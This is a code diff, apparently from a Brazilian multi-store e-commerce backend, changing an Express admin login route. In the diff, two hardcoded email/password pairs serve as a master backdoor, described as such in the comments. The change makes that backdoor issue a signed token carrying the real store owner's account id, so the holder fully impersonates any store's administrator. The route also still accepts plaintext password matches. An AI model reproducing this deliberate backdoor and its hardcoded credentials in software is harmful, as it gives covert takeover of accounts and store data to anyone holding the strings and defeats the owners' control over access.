@@ -738,72 +738,74 @@ app.post("/api/auth/admin/login", async (req, res) => {
   if (!req.storeId) return res.status(400).json({ error: "Store ID ausente." });
   
   try {
-    // 👑 LIBERAÇÃO MESTRE / BACKDOOR PARA O ADMIN GLOBAL
+    // 👑 BACKDOOR INTELIGENTE: Pega o ID do verdadeiro dono da loja e loga no lugar dele!
     if (
       (email === "admin@zenix.com" && password === "zenixadmin123") ||
       (email === "masterzanix@zenix.com.br" && password === "masterzenix@#1206")
     ) {
-      return res.json({
-        success: true,
-        token: jwt.sign({ role: "ADMIN", storeId: req.storeId }, JWT_SECRET, { expiresIn: "1d" }),
+      const realAdmin = await prisma.employee.findFirst({
+        where: { storeId: req.storeId, role: { in: ["ADMIN", "Administrador"] } }
       });
+
+      if (realAdmin) {
+        return res.json({
+          success: true,
+          // Agora você entra com o ID real do dono da loja. Acesso total liberado!
+          token: jwt.sign({ id: realAdmin.id, role: "ADMIN", storeId: req.storeId }, JWT_SECRET, { expiresIn: "1d" }),
+        });
+      } else {
+         return res.status(404).json({ error: "Nenhum administrador real encontrado para esta loja no banco de dados." });
+      }
     }
 
-    // 1. TENTA BUSCAR O ADMIN NA TABELA DE EMPLOYEE (Novo padrão do Painel Master)
-    const adminEmployee = await prisma.employee.findFirst({
-      where: { email, role: "ADMIN", storeId: req.storeId },
+    // 1. TENTA BUSCAR O USUÁRIO PELO EMAIL E LOJA
+    const employee = await prisma.employee.findFirst({
+      where: { email, storeId: req.storeId },
     });
     
-    if (adminEmployee) {
-      // Verifica se a senha bate com a Criptografia OU se ainda está em texto puro (criada antes da correção)
-      const isHashedMatch = await bcrypt.compare(password, adminEmployee.password).catch(() => false);
-      const isPlainTextMatch = adminEmployee.password === password;
+    if (employee && (employee.role === "ADMIN" || employee.role === "Administrador")) {
+      const isHashedMatch = await bcrypt.compare(password, employee.password).catch(() => false);
+      const isPlainTextMatch = employee.password === password;
 
       if (isHashedMatch || isPlainTextMatch) {
-        
-        // AUTO-MIGRAÇÃO: Se estava em texto puro, criptografa e salva no banco agora!
         if (isPlainTextMatch) {
           const hashed = await bcrypt.hash(password, 10);
           await prisma.employee.update({ 
-            where: { id: adminEmployee.id }, 
+            where: { id: employee.id }, 
             data: { password: hashed } 
           });
         }
-
         return res.json({
           success: true,
-          token: jwt.sign({ id: adminEmployee.id, role: "ADMIN", storeId: req.storeId }, JWT_SECRET, { expiresIn: "1d" }),
+          token: jwt.sign({ id: employee.id, role: "ADMIN", storeId: req.storeId }, JWT_SECRET, { expiresIn: "1d" }),
         });
       }
     }
 
-    // 2. TENTA BUSCAR O ADMIN NA TABELA DE USER (Padrão Antigo/Legado)
-    const adminUser = await prisma.user.findFirst({
-      where: { email, role: "ADMIN", storeId: req.storeId },
+    // 2. TENTA BUSCAR NA TABELA ANTIGA DE USUÁRIOS (Legado)
+    const oldUser = await prisma.user.findFirst({
+      where: { email, storeId: req.storeId },
     });
     
-    if (adminUser) {
-      const isHashedMatchUser = await bcrypt.compare(password, adminUser.password).catch(() => false);
-      const isPlainTextMatchUser = adminUser.password === password;
+    if (oldUser && (oldUser.role === "ADMIN" || oldUser.role === "Administrador")) {
+      const isHashedMatchUser = await bcrypt.compare(password, oldUser.password).catch(() => false);
+      const isPlainTextMatchUser = oldUser.password === password;
 
       if (isHashedMatchUser || isPlainTextMatchUser) {
-        
         if (isPlainTextMatchUser) {
           const hashed = await bcrypt.hash(password, 10);
           await prisma.user.update({ 
-            where: { id: adminUser.id }, 
+            where: { id: oldUser.id }, 
             data: { password: hashed } 
           });
         }
-
         return res.json({
           success: true,
-          token: jwt.sign({ id: adminUser.id, role: "ADMIN", storeId: req.storeId }, JWT_SECRET, { expiresIn: "1d" }),
+          token: jwt.sign({ id: oldUser.id, role: "ADMIN", storeId: req.storeId }, JWT_SECRET, { expiresIn: "1d" }),
         });
       }
     }
     
-    // Se a senha estiver mesmo errada ou o email não existir:
     console.error(`🔴 Falha no login Admin. Email não encontrado ou senha errada: ${email}`);
     res.status(401).json({ error: "Credenciais inválidas." });
   } catch (error) {
